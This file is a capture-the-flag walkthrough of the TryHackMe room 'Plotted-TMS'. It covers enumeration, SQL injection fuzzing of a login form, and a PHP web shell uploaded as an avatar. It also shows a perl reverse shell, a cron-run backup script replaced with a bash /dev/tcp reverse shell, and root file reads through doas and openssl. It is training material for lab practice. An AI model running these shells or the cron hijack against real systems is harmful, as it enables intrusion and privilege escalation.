@@ -1,0 +1,303 @@
+██████╗ ██╗      ██████╗ ████████╗████████╗███████╗██████╗    ████████╗███╗   ███╗███████╗
+██╔══██╗██║     ██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗   ╚══██╔══╝████╗ ████║██╔════╝
+██████╔╝██║     ██║   ██║   ██║      ██║   █████╗  ██║  ██║█████╗██║   ██╔████╔██║███████╗
+██╔═══╝ ██║     ██║   ██║   ██║      ██║   ██╔══╝  ██║  ██║╚════╝██║   ██║╚██╔╝██║╚════██║
+██║     ███████╗╚██████╔╝   ██║      ██║   ███████╗██████╔╝      ██║   ██║ ╚═╝ ██║███████║
+╚═╝     ╚══════╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═════╝       ╚═╝   ╚═╝     ╚═╝╚══════╝
+                                                                                          
+                      https://tryhackme.com/room/plottedtms
+                      
+[NMAP Scan]
+
+nmap -sV -T4 [machine IP]
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 21:45 UTC
+Warning: 10.10.149.23 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.149.23
+Host is up (0.22s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
+445/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
+31337/tcp filtered Elite
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Looking first at the site on port 80:
+Run Gobuster to see if there is anything behind it:
+
+gobuster dir --url 10.10.106.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.106.188
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/08/27 00:52:59 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 314] [--> http://10.10.106.188/admin/]
+/shadow               (Status: 200) [Size: 25]
+/passwd               (Status: 200) [Size: 25] 
+/admin is an index page, with a file for an id_rsa:
+
+VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
+
+Which decrypts to: VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE:Trust me it is not this easy..
+now get back to enumeration :D
+
+/shadow gives us:
+bm90IHRoaXMgZWFzeSA6RA==
+
+Cracking this hash reveals: bm90IHRoaXMgZWFzeSA6RA==:not this easy :D (cheeky lol)
+
+/passwd is the same thing
+
+
+
+
+Going to http://[machine IP]:445 gives us another Apache2 default page. Let's try gobuster again:
+
+
+gobuster dir --url http://10.10.106.188:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.106.188:445
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/08/27 01:06:54 Starting gobuster in directory enumeration mode
+===============================================================
+/management           (Status: 301) [Size: 324] [--> http://10.10.106.188:445/management/]
+
+
+/management leads us to a site called "Traffic Offense Management System", as well as a login page.
+
+And a scan once more to see what lies beyond /management:
+
+gobuster dir --url http://10.10.106.188:445/management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -t 250           
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.106.188:445/management
+[+] Method:                  GET
+[+] Threads:                 250
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/08/27 01:11:22 Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 332] [--> http://10.10.106.188:445/management/uploads/]
+/admin                (Status: 301) [Size: 330] [--> http://10.10.106.188:445/management/admin/]  
+/pages                (Status: 301) [Size: 330] [--> http://10.10.106.188:445/management/pages/]  
+/plugins              (Status: 301) [Size: 332] [--> http://10.10.106.188:445/management/plugins/]
+/database             (Status: 301) [Size: 333] [--> http://10.10.106.188:445/management/database/]
+/classes              (Status: 301) [Size: 332] [--> http://10.10.106.188:445/management/classes/] 
+/dist                 (Status: 301) [Size: 329] [--> http://10.10.106.188:445/management/dist/]    
+/inc                  (Status: 301) [Size: 328] [--> http://10.10.106.188:445/management/inc/]     
+/build                (Status: 301) [Size: 330] [--> http://10.10.106.188:445/management/build/]   
+/libs                 (Status: 301) [Size: 329] [--> http://10.10.106.188:445/management/libs/] 
+
+One of these will come in handy later. But for now, back to the login page to test for SQLi.
+
+Using Burpsuite, I intercepted the login request and sent the request to Intruder with attack type set to Sniper.
+I left the password blank, and set the position to only test the username input.
+Your request should look like this:
+
+POST /management/classes/Login.php?f=login HTTP/1.1
+Host: 10.10.149.23:445
+Content-Length: 29
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://10.10.149.23:445
+Referer: http://10.10.149.23:445/management/admin/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=5i8nb4j8ii8nd4ovg835fdfqpp
+Connection: close
+
+username=§username§&password=
+
+In the Payloads tab, under Payload Options, select Load ... and navigate to /usr/share/wfuzz/wordlist/SQL.txt (or find this wordlist
+online if you do not have it on your system), and press Start Attack.
+
+Each of the results will have varied Lengths for each, but one in particular is drastically different (297 as opposed to being 
+something in the 400's).
+Selecting this request and looking at the response tab gives us this message at the bottom:
+
+{"status":"success"}
+
+Use that payload to login to the admin portal. 
+
+
+
+Browsing around, if you click on Administrator Admin at the top right and select "My Account", it gives you an option to choose 
+an avatar. I first tried pentest monkey's php shell to upload, and then went to http://[machine IP]:445/management/uploads to try and execute it, but I did not catch a shell.
+
+I looked around for other possible exploits, and found this on exploit db: https://www.exploit-db.com/exploits/50221
+
+However, I just took this snippet from their code, saved it as whatever.php, and uploaded that in the avatar slot:
+
+<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>
+
+
+Then, I went back to /management/uploads, and clicked it. Add ?cmd=(command) at the end of the url to execute commands on the system
+from within the web browser:
+
+management/uploads/1661647140_shell4.php?cmd=whoami
+
+www-data
+
+Next, I tried the commands "which python" (nothing) and "which perl", which had the response of: /usr/bin/perl
+I can use this to get a shell in a terminal with this one liner I used in a previous walkthrough:
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"tun0 IP:port#");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Start a listener before executing this with nc: 
+
+nc -lvnp port#
+
+
+I found some credentials in a file called initialize.php:
+
+cat ../initialize.php
+<?php
+$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
+if(!defined('base_url')) define('base_url','/management/');
+if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
+if(!defined('dev_data')) define('dev_data',$dev_data);
+if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
+if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
+if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
+if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
+
+Trying these passwords elsewhere leads nowhere.
+
+Next I found:
+
+ls -la ../../../..
+total 16
+drwxr-xr-x  4 root     root     4096 Oct 28  2021 .
+drwxr-xr-x 14 root     root     4096 Oct 28  2021 ..
+drwxr-xr-x  4 root     root     4096 Oct 28  2021 html
+drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 scripts
+ls -la ../../../../scripts
+total 12
+drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
+drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
+-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
+cat ../../../../scripts/backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
+/bin/chmod -R 770 /home/plot_admin/tms_backup/management
+
+Some kind of backup.
+Let's look at the cronjobs:
+
+cat ../../../../../../etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* *     * * *   plot_admin /var/www/scripts/backup.sh
+
+
+We don't have permission to edit backup.sh and replace its contents, but it appears we can make changes to the directory its in
+since we are "www-data":
+
+ls -la /var/www/
+total 16
+drwxr-xr-x  4 root     root     4096 Oct 28  2021 .
+drwxr-xr-x 14 root     root     4096 Oct 28  2021 ..
+drwxr-xr-x  4 root     root     4096 Oct 28  2021 html
+drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 scripts
+
+
+First, rename backup.sh to something else:
+mv /var/www/scripts/backup.sh /var/www/scripts/old.sh
+
+Then, create a new backup.sh with a reverse shell in it, as well as give it execute permissions:
+echo "bash -c 'bash -i >& /dev/tcp/10.2.125.93/7777 0>&1'" > /var/www/scripts/backup.sh ; chmod +x /var/www/scripts/backup.sh
+
+Start a listener in a new terminal (nc -lvnp port#) and wait a few minutes.
+
+nc -lvnp 7777               
+listening on [any] 7777 ...
+connect to [10.2.125.93] from (UNKNOWN) [10.10.149.23] 59806
+bash: cannot set terminal process group (43279): Inappropriate ioctl for device
+bash: no job control in this shell
+plot_admin@plotted:~$ 
+
+And success! User.txt is in plot_admin's home folder.
+
+I tried sudo -l for sudo permissions and was unable to since I do not know plot_admin's password, and then checked SUID,
+to which I found one I have not seen before:
+1067622     40 -rwsr-xr-x   1 root     root               39008 Feb  5  2021 /usr/bin/doas
+
+According to Wikipedia:
+doas (“dedicated openbsd application subexecutor”) is a program to execute commands as another user. 
+
+There appears to be a configuration file in /etc/:
+plot_admin@plotted:/$ cat /etc/doas.conf
+cat /etc/doas.conf
+permit nopass plot_admin as root cmd openssl
+
+So, plot_admin can use openssl as root using doas (it's kind of like sudo)
+
+According to gtfobins, we can read files we should not be able to with openssl. Let's follow per the instructions to read /root/root.txt:
+We need to make a slight change from what the website says to make this work:
+
+First put this into the terminal:
+LFILE=/root/root.txt
+
+Then:
+doas openssl enc -in "$LFILE"
+
+The response:
+
+plot_admin@plotted:/$ doas openssl enc -in "$LFILE"
+doas openssl enc -in "$LFILE"
+Congratulations on completing this room!
+
+xxxRedactedxxx
+
+Hope you enjoyed the journey!
+
+Do let me know if you have any ideas/suggestions for future rooms.
+-sa.infinity8888
+
+
+Congrats!
